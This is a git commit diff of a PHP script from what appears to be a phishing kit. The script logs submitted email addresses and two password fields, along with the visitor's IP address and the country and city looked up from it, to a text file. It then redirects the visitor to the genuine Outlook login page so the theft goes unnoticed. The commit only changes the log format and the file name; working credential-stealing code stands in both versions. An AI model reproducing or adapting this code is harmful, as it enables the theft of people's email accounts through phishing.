188478218381df15fd3bdd86ee9bbb7c5bb812c8
Andres20222 <104866921+Andres20222@users.noreply.github.com>
2022-07-18 00:43:13 -0500

    Update Conection1.php

--- Conection1.php
+++ Conection1.php
@@ -1,3 +1,4 @@
+
 <?php
 
 date_default_timezone_set('America/Caracas');
@@ -7,21 +8,12 @@ $userp = $_SERVER['REMOTE_ADDR'];
 $cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
 $city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
 	
-	$file = fopen("envio01.txt", "a");
+	$file = fopen("envio.txt", "a");
 	
-fwrite($file, 
-"* EMAIL: ".$_POST['email']."
-* PASS: ".$_POST['pass']."
-* PASS1: ".$_POST['pass1']."
-* F-H-IP-P-C: 
-".date('Y-m-d')."
-".date('H:i:s')."
-".$userp."
-".$cc."
-".$city."  
-" . PHP_EOL);
-fwrite($file, "==============================" . PHP_EOL);
+fwrite($file, "".$_POST['email']." | ".$_POST['pass']." | ".$_POST['pass1']." | ".date('Y-m-d')." | ".date('H:i:s')." | ".$userp." ".$cc." ".$city."  " . PHP_EOL);
+fwrite($file, "----------------------------------------- " . PHP_EOL);
 fclose($file);
+
 
 header("location:https://outlook.live.com/owa/");
 
